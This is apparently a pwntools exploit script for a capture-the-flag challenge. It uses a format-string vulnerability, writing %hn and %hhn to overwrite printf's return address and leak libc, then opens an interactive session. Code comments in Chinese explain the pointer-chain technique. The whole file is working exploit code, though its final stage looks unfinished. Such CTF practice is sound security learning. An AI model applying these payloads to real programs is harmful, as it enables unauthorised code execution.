from pwn import *		
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './pwn'

elf = ELF(pwnfile)			
libc = ELF("./libc.so.6")

io = process(pwnfile)
#io=remote('node5.buuoj.cn',26335)
def debug():
	gdb.attach(io,"b printf")
	pause()

io.recvline()
io.recvuntil("Gift addr: ")
stack_adr = int(io.recv(12).decode(),16)
value = (stack_adr) & 0xffff  # - 0x20
print("value--->",hex(value))
success("value:"+hex(value))

buf = 0x4040a0
debug()

'''
先控制三链，再修改对应内容
在一次fmt中如果第一次修改的内容需要被第二次用到，注意第一次避开使用$来定位
'''

payload=b'%p'*6
#payload+=b'%'+str(value).encode()+b'c%hn'   # 调试用目标地址-目前得到的地址
payload+=b'%'+str(value-0x4f).encode()+b'c%hn'


#payload+=b'%'+str(0x10003f-value).encode()+b'c%47$hhn'	# 调试用目标地址-目前得到的地址
payload+=b'%'+str(0x10003f-value+0x28).encode()+b'c%47$hhn'	# 修改printf的返回值
payload+=b'------------%17$p'
payload=payload.ljust(0x100,b'\x00')
io.sendafter("Please leave your message: ",payload)
io.recvuntil("------------")
libc_base = int(io.recv(14),16)-243-libc.sym['__libc_start_main']



payload = b'a'*0x100

io.send(payload)

io.interactive()
